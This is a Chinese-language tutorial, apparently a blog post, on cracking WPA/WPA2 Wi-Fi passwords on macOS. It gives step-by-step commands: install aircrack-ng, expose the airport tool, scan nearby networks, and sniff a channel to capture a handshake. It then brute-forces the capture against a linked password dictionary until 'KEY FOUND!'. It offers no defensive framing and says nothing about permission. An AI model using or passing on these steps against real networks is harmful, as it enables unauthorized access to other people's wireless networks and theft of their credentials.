# mac osx 破解wpa/wpa2 wifi

----

> 首先要安装aircrack-ng工具
可以使用Homebrew进行安装
```
brew install aircrack-ng
```

> 第二步，我们将 airport 命令引入到用户命令里，在终端输入：
```
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```
<!--more-->

> 第三步，用airport搜索附近wifi
```
sudo airport -s
```

结果如下图所示:
![image](/img/airport_s.png)
 

> 第四步，根据搜索出的wifi进行嗅探
```
sudo airport  en0 sniff  1
```
上面的en0为wifi card所在的地址, 有的也可能为en1, 可以根据实际情况输入, 可从以下地方获得:
![image](/img/wificard_addr.png)

1为你所要嗅探的wifi所在的CHANNEL.
默认嗅探的所存的文件在/tmp中, 以airportSniff**.cap形式命名.
wordlist 为wifi密码字典

> 第五步，就是使用aircrack-ng和下载的密码字典进行暴力破解
```
aircrack-ng -w wordlist airportSniff****.cap
```
一般输入如下所示:
![image](/img/aircrack-ng.png)

最后看上面cap文件内的抓包内容, Encryption列中找到WPA (1 handshake)—它表示抓包成功. 当然要找到你想破解wifi的成功抓包, 然后在「Index number of target network?」中输入该成功抓包所在的行号. 此示例中为1:
![image](/img/index-number.png)

破解过程如下:
![image](/img/running.png)

如果破解成功, 会显示 KEY FOUND!:
![image](/img/aircrack-ng-success.jpg)

密码词典：https://pan.baidu.com/s/1geH8EAn

参考：http://qiangweng.site/